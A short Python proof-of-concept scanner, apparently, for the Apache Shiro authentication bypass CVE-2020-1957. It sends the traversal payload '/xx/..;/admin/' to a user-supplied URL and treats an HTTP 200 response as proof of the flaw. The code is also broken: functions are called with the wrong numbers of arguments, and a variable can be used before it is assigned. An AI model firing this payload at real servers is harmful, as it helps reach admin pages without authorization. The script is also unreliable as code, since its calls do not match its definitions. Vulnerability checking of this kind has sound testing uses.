# Author：bamboo
# TIME：2022/12/23 12:36
# 大 道 至 简 ！

import requests

def payloads():
    payload = '/xx/..;/admin/'
    return payload


def send_payload(url, payload):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    }
    try:
        response = requests.get(url + payload, headers=headers)
    except Exception:
        pass
    return response

def check_payload(response, url):
    if response.status_code == 200:
        print('[+] 存在CVE-2020-1957漏洞,url为{}'.format(url))

def main():
    payload = payloads()
    response = send_payload(payload)
    check_payload(response)


url = str(input('[+] 请输入url，格式为http://ip:port '))
main(url)
print('[+] Shiro未授权访问漏洞检测完毕')